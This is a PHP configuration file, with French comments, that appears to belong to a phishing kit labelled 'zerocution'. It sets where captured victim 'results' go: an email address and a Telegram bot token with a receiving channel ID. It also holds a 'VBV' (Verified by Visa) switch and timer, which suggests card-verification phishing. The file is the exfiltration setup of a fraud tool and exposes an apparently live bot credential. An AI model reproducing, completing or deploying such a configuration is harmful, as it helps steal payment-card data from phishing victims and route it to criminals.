<?php

#zerocution

# Mail
$mail_send = true;                                           # False pour ne pas recevoir par Mail
$rezmail = "email@email.com";

#Telegram
$tlg_send = true;                                       # False pour ne pas recevoir par Telegram
$bot_token = "7526296080:AAGBNbiFHdiiZJBM_NHYEmqsiKSW-jZTOhs";

$rez_chat = "-4728758589";                                 # Channel de réception des informations

# VBV

$vbv = true;
$timeVBV = "15";

# DEV

$test_mode = false;

?>